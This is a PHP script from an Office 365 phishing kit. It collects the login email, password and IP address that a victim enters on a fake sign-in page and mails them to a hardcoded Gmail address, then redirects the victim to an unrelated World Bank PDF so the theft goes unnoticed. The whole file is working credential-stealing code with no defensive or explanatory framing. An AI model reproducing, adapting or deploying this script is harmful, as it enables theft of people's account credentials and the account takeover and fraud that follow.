<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office 365-----------------------\n";
$message .= "Email: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Good Vibes------------------------------\n";


$recipient = "shigoodudu@gmail.com";
$subject = "Office 365 RESULT $ip | ".$_POST['login']."\n";
$headers = "info@Feranmi.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Feranmi", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>